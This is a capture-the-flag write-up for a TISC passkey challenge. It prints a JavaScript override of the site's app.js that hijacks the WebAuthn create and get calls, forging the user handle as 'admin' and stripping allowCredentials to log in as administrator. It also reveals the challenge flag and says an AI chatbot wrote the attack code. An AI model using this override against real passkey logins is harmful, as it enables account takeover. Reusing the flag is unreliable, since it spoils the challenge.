# Level-6 - Passkey

DESCRIPTION

Our web crawler has flagged a suspicious unlisted web service that looks to be a portal where SPECTRE operates from. It does not seem to rely on traditional authentication methods, however.

This service is open for anyone to sign up as a user. All you need is a unique username of your choosing, and passkey.

Go to https://passkey.chals.tisc25.ctf.sg to begin.

Good luck, and may your passkeys guide you to victory!

---

Okay so we are given a website where there seems to be a register page and login page. When we try to register we are told to set up a passkey with Windows Hello. 

So I asked CHAT what to do.

It told me to use the Chrome developer tools and use the WebAuthenticator and setup an authenticator. So thats what I did.

<img width="980" height="310" alt="image" src="https://github.com/user-attachments/assets/0889fb25-031c-46cd-86a0-e998f9d4d957" />

Now whenever I register an account, the credentials are saved in the authenticator and I can now login.

<img width="982" height="302" alt="image" src="https://github.com/user-attachments/assets/6f950f50-4746-42b3-9c0c-37e8505bd027" />

After logining we see this dashboard:

<img width="927" height="360" alt="image" src="https://github.com/user-attachments/assets/e2d84811-102b-41b1-ab07-7c932e727b94" />

Clearly we have to be admin somehow, so clearly I asked chat.

It then told me I had to override the /app.js the website uses. (duh)

And after much prompts it finally gave me a app.js file that when used to override, allowed me to login as admin.

```
function base64UrlToBuffer(b64url) {
  const pad = '='.repeat((4 - (b64url.length % 4)) % 4);
  const b64 = (b64url + pad).replace(/-/g, '+').replace(/_/g, '/');
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
  return arr.buffer;
}

function bufferToBase64Url(buf) {
  const bytes = new Uint8Array(buf);
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

(function () {
  const toAB = (v) => {
    if (v instanceof ArrayBuffer) return v;
    if (ArrayBuffer.isView?.(v)) {
      // copy the view's bytes into a standalone ArrayBuffer
      return v.buffer.slice(v.byteOffset, v.byteOffset + v.byteLength);
    }
    return new TextEncoder().encode(String(v)).buffer;
  };

  // --- REGISTER: force admin handle; require resident + UV; use cross-platform key (USB/NFC)
  const oldCreate = navigator.credentials.create?.bind(navigator.credentials);
  if (oldCreate) {
    navigator.credentials.create = async (opts) => {
      try {
        const pk = opts?.publicKey ?? {};
        if (pk.user?.id) pk.user.id = toAB("admin"); // change to "uzc" if needed

        const sel = (pk.authenticatorSelection ||= {});
        sel.authenticatorAttachment = "cross-platform";   // important for USB/NFC
        sel.residentKey = "required";
        pk.requireResidentKey = true;                     // legacy flag some libs read
        sel.userVerification = "required";

        console.log("[override] REGISTER opts", {
          rpId: pk.rp?.id, rk: sel.residentKey, uv: sel.userVerification,
          attachment: sel.authenticatorAttachment, userIdLen: pk.user?.id?.byteLength
        });

        const cred = await oldCreate(opts);
        console.log("[override] REGISTER success", cred);
        return cred;
      } catch (e) {
        console.error("[override] REGISTER failed:", e.name, e.message);
        throw e;
      }
    };
  }

  // --- LOGIN: only clear allowCredentials for admin/uzc so normal users still work
  const oldGet = navigator.credentials.get?.bind(navigator.credentials);
  if (oldGet) {
    navigator.credentials.get = async (opts) => {
      try {
        const m = document.body?.innerText?.match(/Authenticating\s+([^\.\s]+)/);
        const uname = m?.[1]?.trim().toLowerCase();
        if ((uname === "admin" || uname === "uzc") && opts?.publicKey?.allowCredentials) {
          delete opts.publicKey.allowCredentials;
          console.log("[override] LOGIN(", uname, "): cleared allowCredentials");
        } else {
          console.log("[override] LOGIN(", uname ?? "unknown", "): kept allowCredentials");
        }
        const asr = opts?.publicKey?.allowSilentDiscovery ?? false;
        console.log("[override] LOGIN opts", { asr });
        const assertion = await oldGet(opts);
        console.log("[override] LOGIN success", assertion);
        return assertion;
      } catch (e) {
        console.error("[override] LOGIN failed:", e.name, e.message);
        throw e;
      }
    };
  }
})();
```

Now all I had to do was to register any account and login with the user admin. And it works!

<img width="943" height="391" alt="image" src="https://github.com/user-attachments/assets/01bf6120-a138-4ff6-856f-87dcc64f3aef" />

We are now jacked in as admin and can access the admin dashboard. On the dashboard, the flag is displayed

<img width="464" height="221" alt="image" src="https://github.com/user-attachments/assets/4bb2f856-66e6-42b5-bc09-35523e963669" />

FLAG: TISC{p4ssk3y_is_gr3a7_t|sC}

(Read other writeups if you want to know what this chall does) (Also prepare for like 1 more writeup where CHAT did most of the work)
